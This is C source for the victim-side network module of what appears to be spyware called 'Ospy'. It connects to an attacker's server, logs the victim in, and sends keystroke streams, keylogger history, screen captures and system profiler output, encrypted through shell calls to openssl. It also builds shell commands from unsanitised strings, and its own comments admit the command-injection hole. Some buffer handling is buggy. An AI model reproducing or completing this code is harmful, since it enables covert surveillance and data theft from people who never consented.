#include "connection.h"

STATUS create_connection(){
	struct sockaddr_in serverAddr;
	
	V_S_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	if(V_S_socket < 0)
		return FAILUR;
	
	memset(&serverAddr, '\0', sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(PORT);
	serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
	if(connect(V_S_socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
		return FAILUR;
	return SUCCESS;
}

void log_in_victim () {
	encrypted_general_message_protocol encrypted_message;
	encrypted_message.i_am = VICTIM;
	encrypted_message.action = LOG_IN;
	FILE * config_file = fopen("config","rb");
	
	fgets(encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, MAX_USER_NAME_LEN, config_file);
	fgets(encrypted_message.data.encrypted_login_vicim_to_Ospy.id, HASH_LEN, config_file);
	
	strtok(encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, "\n"); // remove the new line
	strtok(encrypted_message.data.encrypted_login_vicim_to_Ospy.id, "\n"); // remove the new line
	
	//encrypt the user name
	strcpy(encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, encrypt_text (encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, AES_KEY));

	send(V_S_socket, &encrypted_message, sizeof(encrypted_message), 0);
	fclose(config_file);
}
// victim to server encrypted message handler, get main_data struct and encrypt it in aes 
void V_2_S_encrypted_message_handler(main_data data, action_type action){ // victim - server 
	encrypted_general_message_protocol encrypted_message;
	encrypted_message.i_am = VICTIM;
	encrypted_message.action = action;
	
	switch (action) {
		case GET_KEYSTROKES_STREAM :
			strcpy(encrypted_message.data.keylogger_stream_key, encrypt_text(data.keylogger_stream_key, AES_KEY));
			
			break;
		
		// all these options result in sending to the attacker a file. the encryption of the file is in the "send_file" function
		case GET_SYSTEM_PROFILER :
		case GET_KEYLOGGER_HISTORY :
		case GET_SCREEN_STREAM :
			strcpy(encrypted_message.data.file_data.file_sub_buffer, data.file_data.file_sub_buffer);
			encrypted_message.data.file_data.end_of_file = data.file_data.end_of_file;
			break;
					
		default :
			break;
	}
	
	send(V_S_socket, &encrypted_message, sizeof(encrypted_message), 0);
}

// send a file in plain text or in AES-256-CBC encrypted way
void send_file (char * file_name, action_type action, bool convert_to_base64_and_encrypt) {
	main_data data;
	char sub_buffer[MTU];
	FILE * base64_file_descriptor;
	
	char convert_file_to_buffer_commend[MAX_FILE_TO_BUFFER_COMMEND_LEN];
	
	if (convert_to_base64_and_encrypt)
		sprintf(convert_file_to_buffer_commend, "openssl aes-256-cbc -base64 -in %s -k %s", file_name, AES_KEY); // there is injection variability, to be fix
		
	else {
		strcpy(convert_file_to_buffer_commend, "cat ");
		strcat(convert_file_to_buffer_commend, file_name);
	}
	
	fflush(stdout);
	base64_file_descriptor = popen(convert_file_to_buffer_commend, "r");
	
	data.file_data.end_of_file = 0;
	while (fgets(sub_buffer, sizeof(sub_buffer), base64_file_descriptor) != NULL) {
		strcpy(data.file_data.file_sub_buffer, sub_buffer);
		V_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
	}
	data.file_data.end_of_file = 1;
	V_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
	pclose(base64_file_descriptor);
}


// AES 256 cbc encryption
char * encrypt_text (char * text_to_encrypt, char * encrypt_key){
	int max_len = (strlen(text_to_encrypt) * 1.36) + 100;
	char * encrypted_text = (char *) malloc(max_len * sizeof(char));
	char sub_buffer[65];
	char encrypt_commend[40 + strlen(text_to_encrypt) + strlen(encrypt_key)];
	sprintf(encrypt_commend, "echo %s | openssl aes-256-cbc -base64 -k %s", text_to_encrypt, encrypt_key); // there is injection variability, to be fix
	FILE * aes_encryption_fd = popen(encrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_encryption_fd) != NULL) {
		strtok(sub_buffer, "\n");
		strcat(encrypted_text, sub_buffer);
	}
	pclose(aes_encryption_fd);
	return encrypted_text;
}

//AES 256 cbc decryption
char * decrypt_text (char * text_to_decrypt, char * decryption_key){
	strtok(text_to_decrypt, "\n");
	char * decrypted_text = (char *) malloc(strlen(text_to_decrypt) * sizeof(char));
	char sub_buffer[65];
	char decrypt_commend[40 + strlen(text_to_decrypt) + strlen(decryption_key)];
	sprintf(decrypt_commend, "echo %s | openssl aes-256-cbc -d -base64 -k %s", text_to_decrypt, decryption_key);// there is injection variability, to be fix

	FILE * aes_decryption_fd = popen(decrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_decryption_fd) != NULL) {
		strtok(sub_buffer, "\n");
		strcat(decrypted_text, sub_buffer);
	}	
	pclose(aes_decryption_fd);
	return decrypted_text;
}